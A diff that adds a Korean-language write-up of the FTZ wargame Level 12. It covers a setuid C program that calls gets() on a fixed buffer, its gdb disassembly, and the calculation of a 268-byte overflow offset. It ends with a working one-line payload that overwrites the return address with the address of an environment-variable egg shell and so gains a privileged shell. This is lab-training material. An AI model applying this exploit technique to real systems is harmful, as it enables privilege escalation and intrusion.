@@ -157,6 +157,81 @@ my-pass로 답을 얻어오면 된다.
 
 
 
+#================================================================================#
+#FTZ Level 12
+hint)
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+ 
+int main( void )
+{
+	char str[256];
+
+ 	setreuid( 3093, 3093 );
+	printf( "문장을 입력하세요.\n" );
+	gets( str );
+	printf( "%s\n", str );
+}  
+
+#FTZ Level 12 풀이 과정)
+방식이 비슷해보인다. EGGSHELL로 BOF를 하면 될 것 같다.
+근데 다른 점이, 실행과 동시에 인자를 받아서 하는 것이 아닌 안에 문장을 넣어야 한다.
+일단, 어셈으로 까보자. 직접 인자를 하나하나 넣어서 세그먼트 오류가 나는 것도 좋지만 아직은 어셈을 봐야
+실력일 늘 것 같다.
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+intel 형식으로 바꾸고 진행했다.
+
+Dump of assembler code for function main:
+0x08048470 <main+0>:	push   ebp
+0x08048471 <main+1>:	mov    ebp,esp
+0x08048473 <main+3>:	sub    esp,0x108
+0x08048479 <main+9>:	sub    esp,0x8
+0x0804847c <main+12>:	push   0xc15
+0x08048481 <main+17>:	push   0xc15
+0x08048486 <main+22>:	call   0x804835c <setreuid>
+0x0804848b <main+27>:	add    esp,0x10
+0x0804848e <main+30>:	sub    esp,0xc
+0x08048491 <main+33>:	push   0x8048538
+0x08048496 <main+38>:	call   0x804834c <printf>
+0x0804849b <main+43>:	add    esp,0x10
+0x0804849e <main+46>:	sub    esp,0xc
+0x080484a1 <main+49>:	lea    eax,[ebp-264]
+0x080484a7 <main+55>:	push   eax
+0x080484a8 <main+56>:	call   0x804831c <gets>
+0x080484ad <main+61>:	add    esp,0x10
+0x080484b0 <main+64>:	sub    esp,0x8
+0x080484b3 <main+67>:	lea    eax,[ebp-264]
+0x080484b9 <main+73>:	push   eax
+0x080484ba <main+74>:	push   0x804854c
+0x080484bf <main+79>:	call   0x804834c <printf>
+0x080484c4 <main+84>:	add    esp,0x10
+0x080484c7 <main+87>:	leave  
+0x080484c8 <main+88>:	ret    
+0x080484c9 <main+89>:	lea    esi,[esi]
+0x080484cc <main+92>:	nop    
+0x080484cd <main+93>:	nop    
+0x080484ce <main+94>:	nop    
+0x080484cf <main+95>:	nop    
+
+0x08048473 <main+3>:	sub    esp,0x108 을보면
+일단 스택에 264 바이트를 할당한다. 아마 256바이트와 char형 데이터에 8byte dummy를 추가했다.
+그렇다면 스택에는 EBP까지 하여 총 268byte의 문자열을 입력하면(null포함 269byte가 되기에.) 오버플로우가 일어난다는 것을 추측 할 수 있다.
+일단 에그쉘로 실행시켜야 하기에, 에그쉘 코드를 이용해서 환경변수의 주소를 얻어오자. (코드는 leve11 풀이에 있다.)
+에그쉘의 제대로된 주소값도 얻어오는 코드도 컴파일 하자.
+환경변수에 에그쉘(/bin/bash가 포함된) 코드를 넣고 주소를 얻었다.
+Addr = 0xbffff2c5
+이것을 268byte 문자열 뒤에 리틀 엔디언 방식으로 변환하여 코드로 넣어주면 되겠다.
+/tmp/12에서 진행했기에 절대경로로 실행했다.
+(python -c 'print"A"*268 + "\xc5\xf2\xff\xbf"'; cat)  | /home/level12/attackme
+하면 문자열 오류가 보이면서 shell이 이상하게 작동될텐데 id를 쳐보니까 권한이 잘 얻어왔다.
+my-pass로 하면 답이 나온다.
+
+
+답 == have no clue
+
+
 
 
 
